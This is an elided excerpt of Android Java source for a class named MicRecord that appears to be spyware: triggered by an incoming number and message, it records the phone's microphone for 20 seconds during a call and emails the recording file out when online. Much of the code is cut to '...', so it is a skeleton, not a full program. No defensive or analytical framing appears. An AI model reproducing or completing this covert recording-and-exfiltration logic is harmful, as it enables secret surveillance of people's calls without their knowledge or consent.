...
public class MicRecord extends BroadcastReceiver {
    ...
    public void onReceive(Context context, Intent intent) {
        Log.d(TAG, "mic onReceive called with action: " + intent.getAction());
        try {
    ...
    public void startRecording(Context context, String incomingNumber, String messageBody) {
        ...
        if (isOnCall) {
            ...
            try {
                ...
                handler.postDelayed(() -> stopRecording(context), 20000);
            } catch (IOException e) {
        ...
        if (recorder != null) {
            try {
                ...
                if (isInternetAvailable(context)) {
                    sendEmailWithAttachment("Sound Recording", "Here is the Sound recording file:", fileName);
                } else {
